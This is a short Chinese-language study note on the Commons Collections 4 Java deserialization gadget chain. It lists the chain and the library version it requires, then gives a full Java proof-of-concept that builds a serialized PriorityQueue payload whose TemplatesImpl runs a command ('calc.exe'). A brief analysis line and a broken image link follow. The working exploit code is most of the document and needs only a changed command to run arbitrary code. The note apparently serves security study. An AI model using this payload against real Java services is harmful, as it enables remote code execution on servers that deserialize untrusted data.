# cc4

## Gadget chain&Requires

```
和CC2不同的是，CC4使用了InstantiateTransformer代替InvokerTransformer
Gadget chain:
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
					TransformingComparator.compare()
						InstantiateTransformer.transform()
							TemplatesImpl.newTransformer()
Require:
    Apache Commons Collections 4-4.0
    jdk1.7	
						

```

## poc

```java
package com.payload;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.utils.Gadgets;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CC4 {
    public static Object getObject() throws Exception {
        Object templatesImpl = Gadgets.createTemplatesImpl("calc.exe", TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);

        ConstantTransformer constant = new ConstantTransformer(String.class);

        // mock method name until armed
        Class[] paramTypes = new Class[] { String.class };
        Object[] args = new Object[] { "foo" };
        InstantiateTransformer instantiate = new InstantiateTransformer(
                paramTypes, args);
        
        paramTypes = (Class[]) getFieldValue(instantiate, "iParamTypes");
        args = (Object[]) getFieldValue(instantiate, "iArgs");

        ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });

        PriorityQueue queue = new PriorityQueue(2,new TransformingComparator(chain));
        queue.add(1);
        queue.add(1);

        setFieldValue(constant, "iConstant", TrAXFilter.class);
        paramTypes[0] = Templates.class;
        args[0] = templatesImpl;

        return queue;
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static Object getFieldValue(Object obj, String fieldName) throws NoSuchFieldException, IllegalAccessException {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

}
```

## analysis

![image-20220526084718255](C:\Users\Liyc\Desktop\java反序列化\cc4\cc4.assets\image-20220526084718255.png)

在`InstantiateTransformer`类的`transform`方法中加载了恶意类

